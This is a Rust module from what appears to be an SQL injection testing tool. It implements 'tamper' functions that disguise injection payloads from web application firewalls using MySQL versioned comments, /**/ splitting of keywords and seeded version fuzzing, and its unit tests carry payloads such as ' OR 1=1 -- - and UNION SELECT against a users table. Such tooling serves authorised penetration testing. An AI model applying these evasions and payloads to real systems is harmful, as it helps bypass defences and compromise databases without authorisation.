//! Keyword-wrapping tampers: versioned comments, between-comment,
//! extended keyword set and seeded version fuzz.

use regex::Regex;
use std::sync::OnceLock;

static KEYWORDS: &[&str] = &[
    "SELECT",
    "UNION",
    "OR",
    "AND",
    "FROM",
    "WHERE",
    "SLEEP",
    "BENCHMARK",
    "EXTRACTVALUE",
    "UPDATEXML",
    "CONCAT",
    "CAST",
    "CONVERT",
    "WAITFOR",
    "DELAY",
    "ORDER",
    "BY",
    "GROUP",
    "HAVING",
    "LIMIT",
    "BETWEEN",
    "LIKE",
    "INTO",
    "VALUES",
    "INSERT",
    "UPDATE",
    "DELETE",
    "DROP",
    "TABLE",
];

/// Keyword regex compiled once. Returns `None` instead of panicking when
/// the (constant) pattern fails to build — callers treat `None` as
/// match-never and return the payload unchanged.
fn keyword_regex() -> Option<&'static Regex> {
    static RE: OnceLock<Option<Regex>> = OnceLock::new();
    RE.get_or_init(|| {
        let pattern = format!(r"(?i)\b({})\b", KEYWORDS.join("|"));
        Regex::new(&pattern).ok()
    })
    .as_ref()
}

pub(super) fn apply_versioned_comment(payload: &str) -> String {
    let Some(re) = keyword_regex() else {
        return payload.to_owned();
    };
    re.replace_all(payload, |caps: &regex::Captures| {
        let m = &caps[0];
        format!("/*!50000{m}*/")
    })
    .into_owned()
}

/// Extra keywords wrapped only by [`Tamper::VersionedMoreKeywords`]
/// (disjoint from [`KEYWORDS`] so the two tampers stay distinguishable).
static MORE_KEYWORDS: &[&str] = &[
    "ALL",
    "DISTINCT",
    "AS",
    "ON",
    "JOIN",
    "LEFT",
    "RIGHT",
    "INNER",
    "OUTER",
    "CASE",
    "WHEN",
    "THEN",
    "ELSE",
    "END",
    "NOT",
    "NULL",
    "IS",
    "IN",
    "EXISTS",
    "COUNT",
    "SUM",
    "AVG",
    "MIN",
    "MAX",
    "LENGTH",
    "SUBSTRING",
    "SUBSTR",
    "ASCII",
    "CHAR",
    "DATABASE",
    "USER",
    "VERSION",
    "SCHEMA",
    "INFORMATION_SCHEMA",
    "LOAD_FILE",
    "OUTFILE",
    "RLIKE",
    "REGEXP",
    "XOR",
    "DIV",
    "MOD",
    "TOP",
    "OFFSET",
    "FETCH",
    "DECLARE",
    "EXEC",
    "EXECUTE",
    "TRUE",
    "FALSE",
    "PG_SLEEP",
];

fn keyword_more_regex() -> Option<&'static Regex> {
    static RE: OnceLock<Option<Regex>> = OnceLock::new();
    RE.get_or_init(|| {
        let mut all: Vec<&str> = Vec::with_capacity(KEYWORDS.len() + MORE_KEYWORDS.len());
        all.extend_from_slice(KEYWORDS);
        all.extend_from_slice(MORE_KEYWORDS);
        let pattern = format!(r"(?i)\b({})\b", all.join("|"));
        Regex::new(&pattern).ok()
    })
    .as_ref()
}

pub(super) fn apply_versioned_more_keywords(payload: &str) -> String {
    let Some(re) = keyword_more_regex() else {
        return payload.to_owned();
    };
    re.replace_all(payload, |caps: &regex::Captures| {
        let m = &caps[0];
        format!("/*!50000{m}*/")
    })
    .into_owned()
}

pub(super) fn apply_between_comment(payload: &str) -> String {
    // Cheap heuristic: insert /**/ between letters of SQL keywords.
    // e.g. SELECT -> S/**/E/**/L/**/E/**/C/**/T
    let Some(re) = keyword_regex() else {
        return payload.to_owned();
    };
    re.replace_all(payload, |caps: &regex::Captures| {
        let m = &caps[0];
        let mut out = String::with_capacity(m.len() * 5);
        let chars: Vec<char> = m.chars().collect();
        for (i, ch) in chars.iter().enumerate() {
            out.push(*ch);
            if i + 1 < chars.len() {
                out.push_str("/**/");
            }
        }
        out
    })
    .into_owned()
}

/// Seeded MySQL version fuzz: wraps the same keyword set as
/// [`Tamper::VersionedComment`] but draws one `<V>` per payload from
/// `0/32302/50000/80000/99999` plus one `/*!` vs `/**!` opening per payload
/// from `rng`, so `--seed` replays byte-identical output.
pub(super) fn apply_versioned_fuzz(payload: &str, rng: &mut impl rand::Rng) -> String {
    static VERSIONS: &[&str] = &["0", "32302", "50000", "80000", "99999"];
    let Some(re) = keyword_regex() else {
        return payload.to_owned();
    };
    let version = VERSIONS[rng.random_range(0..VERSIONS.len())];
    let opener = if rng.random_bool(0.5) { "/**!" } else { "/*!" };
    re.replace_all(payload, |caps: &regex::Captures| {
        let m = &caps[0];
        format!("{opener}{version}{m}*/")
    })
    .into_owned()
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use crate::techniques::tamper::Tamper;

    #[test]
    fn randomcase_changes_case() {
        let out = Tamper::RandomCase.apply("select");
        // randomcase should at least contain same letters case-insensitively
        assert_eq!(out.to_ascii_lowercase(), "select");
        // length preserved
        assert_eq!(out.len(), 6);
    }

    #[test]
    fn versioned_wraps_keywords() {
        let out = Tamper::VersionedComment.apply("' OR 1=1 -- -");
        assert!(out.contains("/*!50000OR*/"), "got {out}");
        let out2 = Tamper::VersionedComment.apply("' UNION SELECT 1,2 -- -");
        assert!(out2.contains("/*!50000UNION*/"));
        assert!(out2.contains("/*!50000SELECT*/"));
    }

    #[test]
    fn betweencomment_inserts() {
        let out = Tamper::BetweenComment.apply("SELECT");
        assert_eq!(out, "S/**/E/**/L/**/E/**/C/**/T");
        let out2 = Tamper::BetweenComment.apply("' OR 1=1");
        assert!(out2.contains("O/**/R"));
    }

    #[test]
    fn versionedmorekeywords_wraps_extended_set() {
        let out = Tamper::VersionedMoreKeywords.apply("' UNION SELECT 1,2 -- -");
        assert!(out.contains("/*!50000UNION*/"), "got {out}");
        assert!(out.contains("/*!50000SELECT*/"), "got {out}");
        // extended keywords untouched by the base versionedcomment tamper
        let more = Tamper::VersionedMoreKeywords.apply("SELECT CASE WHEN 1=1 ELSE 2 END");
        assert!(more.contains("/*!50000CASE*/"), "got {more}");
        assert!(more.contains("/*!50000WHEN*/"), "got {more}");
        let base = Tamper::VersionedComment.apply("SELECT CASE WHEN 1=1 ELSE 2 END");
        assert!(
            !base.contains("/*!50000CASE*/"),
            "base must not wrap CASE: {base}"
        );
    }

    #[test]
    fn versioned_more_is_superset_of_versioned() {
        let payload = "' UNION SELECT 1,2 -- -";
        let base = Tamper::VersionedComment.apply(payload);
        let more = Tamper::VersionedMoreKeywords.apply(payload);
        assert!(base.contains("/*!50000UNION*/"), "got {base}");
        assert!(more.contains("/*!50000UNION*/"), "got {more}");
        // `CASE/WHEN` wrappé uniquement par more (disjoint MORE_KEYWORDS).
        let extended = "SELECT CASE WHEN 1=1 ELSE 2 END";
        assert!(
            !Tamper::VersionedComment
                .apply(extended)
                .contains("/*!50000CASE*/")
        );
        assert!(
            Tamper::VersionedMoreKeywords
                .apply(extended)
                .contains("/*!50000CASE*/")
        );
    }

    #[test]
    fn versionedfuzz_wraps_with_seeded_version() {
        use crate::seeded_rng::make_rng;
        let mut rng = make_rng(Some(42));
        let out = Tamper::VersionedFuzz.apply_with_rng("' OR 1=1 -- -", &mut rng);
        assert!(out.contains("/*!") || out.contains("/**!"), "got {out}");
        assert!(out.contains("*/"), "got {out}");
        assert!(
            ["0", "32302", "50000", "80000", "99999"]
                .iter()
                .any(|v| out.contains(v)),
            "seeded version missing: {out}"
        );
        assert!(out.contains("1=1"), "TRUE marker must survive: {out}");
    }

    #[test]
    fn versionedfuzz_same_seed_identical() {
        use crate::seeded_rng::make_rng;
        let payload = "' UNION SELECT 1,2 -- -";
        let mut a = make_rng(Some(7));
        let mut b = make_rng(Some(7));
        assert_eq!(
            Tamper::VersionedFuzz.apply_with_rng(payload, &mut a),
            Tamper::VersionedFuzz.apply_with_rng(payload, &mut b)
        );
    }

    #[test]
    fn versionedfuzz_seeds_cover_multiple_versions() {
        use crate::seeded_rng::make_rng;
        use std::collections::HashSet;
        let payload = "' UNION SELECT * FROM users -- -";
        let mut distinct = HashSet::new();
        for seed in 1..=12 {
            let mut rng = make_rng(Some(seed));
            distinct.insert(Tamper::VersionedFuzz.apply_with_rng(payload, &mut rng));
        }
        assert!(
            distinct.len() >= 2,
            "seeded fuzz should vary versions/openers across seeds"
        );
    }
}
